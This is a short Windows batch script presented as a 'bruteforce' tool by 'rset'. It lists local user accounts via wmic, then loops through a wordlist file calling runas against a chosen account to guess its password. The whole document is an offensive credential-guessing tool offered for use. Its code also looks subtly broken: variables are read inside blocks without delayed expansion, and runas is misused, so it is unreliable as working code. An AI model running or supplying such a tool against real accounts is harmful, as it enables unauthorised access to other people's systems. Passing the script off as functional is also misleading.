@echo off
setlocal enabledelayedexpansion

echo  ___.                 __          _____                           
echo \_ |_________ __ ___/  |_  _____/ ____\___________   ____  ____  
echo  | __ \_  __ \  |  \   __\/ __ \   __\/  _ \_  __ \_/ ___\/ __ \ 
echo  | \_\ \  | \/  |  /|  | \  ___/|  | (  <_> )  | \/\  \__\  ___/ 
echo  |___  /__|  |____/ |__|  \___  >__|  \____/|__|    \___  >___  >
echo     \/                       \/                        \/    \/ 
echo                                                           by rset
echo ■===============■
echo ║ 1. List users ║
echo ║ 2. Bruteforce ║
echo ■===============■
set /p choice="Select an option: "

if "%choice%"=="1" (
    echo Listing users:
    echo.
    wmic useraccount get name,sid,status
    pause
    exit
)

if "%choice%"=="2" (
    set /p user="Enter user: "
    echo Starting brute force attack on user: %user%
    for /f %%p in (hashlist.txt) do (
        <nul set /p %%p
        set lastPassword=%%p
        runas /user:%user% "echo %%p" >nul 2>&1
        if %errorlevel%==0 (
            echo PASSWORD FOUND: %%p
            exit
        )
    )
    echo Password not found!
    pause
    exit
)

echo Invalid choice!
pause
